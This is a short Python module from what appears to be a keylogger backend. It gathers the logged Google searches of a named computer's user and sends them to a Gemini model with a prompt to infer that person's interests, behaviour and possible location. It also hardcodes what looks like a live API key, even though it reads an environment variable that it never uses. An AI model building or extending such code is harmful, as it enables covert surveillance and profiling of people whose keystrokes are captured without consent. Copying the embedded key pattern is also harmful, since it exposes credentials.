import google.generativeai as genai
from dotenv import load_dotenv
import os
from keyloggerBackend.app.logic.computers_logic import get_data_by_computer



def get_profile_by_computer(computer_name):
    data = get_data_by_computer(computer_name)
    searches = []

    for timestamp, computers in data.items():
        for activities in computers:
            for activity in activities:
                if "Google" in activity:
                    searches.append(activity)

    profile_about_user = help_get_profile_by_computer(searches)
    print("Google Searches:", searches)
    print("Profile Data:", profile_about_user)
    return profile_about_user


def help_get_profile_by_computer(searches):
    # print("Searches:" ,searches)
    api_key = os.getenv("API_KEY")
    if not api_key:
        raise ValueError("API_KEY is not set in the environment variables.")

    genai.configure(api_key="AIzaSyBNje5gtvcKIeyoSobzu0-1AVD2OTUGMEE")

    model = genai.GenerativeModel("gemini-pro")
    # response = model.generate_content(
    #     "Build a concise user profile based on the following searches, without listing the searches themselves: " + str(
    #         searches)
    # )
    response = model.generate_content(
        "Analyze the user's searches and generate a structured profile, including interests, behavior, and possible location, without explicitly listing the searches."
        + str(
            searches)
    )

    # response = model.generate_content("how are you today?")
    print(response.text)
    return response.text
